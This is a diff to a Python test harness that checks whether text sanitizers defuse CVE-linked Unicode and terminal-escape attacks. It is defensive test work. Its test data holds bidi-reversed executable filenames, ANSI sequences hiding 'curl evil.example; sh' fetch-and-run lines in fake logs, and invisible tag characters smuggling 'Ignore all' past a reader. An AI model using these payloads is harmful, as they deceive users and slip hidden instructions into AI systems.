@@ -14,9 +14,15 @@ to suit it, and the predicate is the repo's existing XMR idea rather than a new
 one invented here:
 
 *Collapse* cases have a benign twin, so the test is ``P(attack) == P(benign)``
-case-insensitively — a tool that lowercases (decancer always does) is not
-penalized for it. *Removal* cases have no benign twin, so the test is that the
-attack primitive is gone from the output.
+compared with ``str.lower()`` — a tool that lowercases (decancer always does) is
+not penalized for it. *Removal* cases have no benign twin, so the test is that
+the attack primitive is gone from the output.
+
+**The comparison uses ``lower()`` rather than ``casefold()`` deliberately.**
+``casefold()`` performs Unicode full case folding, which maps ``ß`` to ``ss`` —
+the exact fold CVE-2026-23950 is about. Neutralizing with it would have made
+every tool pass that row by measuring Python instead of the tool. ``lower()``
+leaves ``ß`` alone, and switching produced no change on any other row.
 
 **These are three tools built for three jobs, and the table is not a ranking.**
 `unidecode` is a romanizer: it maps by *sound*, and was never intended as a
@@ -60,7 +66,7 @@ def _no_bidi(text: str) -> bool:
 # two reconstructions of the same CVE are a weak cross-check on both. The CVE
 # *set* is gated against the registry by TestComparatorCorpusDrift.
 
-#: (cve, attack, benign) — handled when P(attack) == P(benign), casefolded.
+#: (cve, attack, benign) — handled when P(attack) == P(benign) under lower().
 COLLAPSE: list[tuple[str, str, str]] = [
     ("CVE-2021-42694", "isАdmin", "isAdmin"),
     ("CVE-2019-19844", "admın@example.com", "admin@example.com"),
@@ -71,6 +77,12 @@ COLLAPSE: list[tuple[str, str, str]] = [
     ("CVE-2017-7833", "exaّmple.com", "example.com"),
     ("CVE-2017-5383", "ex‐ample.com", "ex-ample.com"),
     ("CVE-2023-24329", "\x00https://evil.example.net", "https://evil.example.net"),
+    ("CVE-2019-11721", "banĸ.example", "bank.example"),
+    # The sharp-s row is why the neutralizer is lower() and not casefold();
+    # see the module docstring. disarm's canonicalizers deliberately do not
+    # clear this one — its key builders do — so it is comparable without being
+    # part of the canonicalizer-clearable set.
+    ("CVE-2026-23950", "groß.txt", "gross.txt"),
 ]
 
 #: (cve, attack, predicate) — handled when the primitive is gone from the output.
@@ -79,12 +91,12 @@ REMOVAL: list[tuple[str, str, Callable[[str], bool]]] = [
     (
         "CVE-2009-3376",
         "photo_high_re‮gnp.js",
-        lambda out: _no_bidi(out) and out.casefold().endswith(".js"),
+        lambda out: _no_bidi(out) and out.lower().endswith(".js"),
     ),
     (
         "CVE-2023-33955",
         "report‮fdp.exe",
-        lambda out: _no_bidi(out) and out.casefold().endswith(".exe"),
+        lambda out: _no_bidi(out) and out.lower().endswith(".exe"),
     ),
     (
         "CVE-2008-2383",
@@ -101,6 +113,29 @@ REMOVAL: list[tuple[str, str, Callable[[str], bool]]] = [
         "Please summarize." + "".join(chr(0xE0000 + ord(c)) for c in "Ignore all"),
         lambda out: not _has_tag_chars(out),
     ),
+    (
+        "CVE-2025-55754",
+        "GET /\x1b[1A\x1b[2Krun: curl evil.example; sh HTTP/1.1",
+        lambda out: not any(ch in out for ch in TERMINAL),
+    ),
+    (
+        "CVE-2024-52005",
+        "fatal: repository not found\x1b[1A\x1b[2K$ curl evil.example; sh",
+        lambda out: not any(ch in out for ch in TERMINAL),
+    ),
+    (
+        "CVE-2023-43620",
+        "invoice\x1b[2K\x1b[1Gevil.sh",
+        lambda out: not any(ch in out for ch in TERMINAL),
+    ),
+    (
+        "CVE-2023-37275",
+        "Executing command\x1b[2K\x1b[1G  [OK] nothing happened",
+        lambda out: not any(ch in out for ch in TERMINAL),
+    ),
+    # A pile of marks, bounded rather than removed: the defense is that the run
+    # cannot reach a downstream stage, not that the base character goes away.
+    ("CVE-2017-20190", "a" + ("\u0301" * 2_000), lambda out: len(out) <= 4),
 ]
 
 #: Every CVE this comparison covers. Gated against the test registry.
@@ -143,7 +178,7 @@ def evaluate(tools: dict[str, Callable[[str], str]]) -> dict[str, dict[str, bool
         row = {}
         for name, fn in tools.items():
             got, want = _apply(fn, attack), _apply(fn, benign)
-            row[name] = got is not None and want is not None and got.casefold() == want.casefold()
+            row[name] = got is not None and want is not None and got.lower() == want.lower()
         results[cve] = row
     for cve, attack, predicate in REMOVAL:
         row = {}
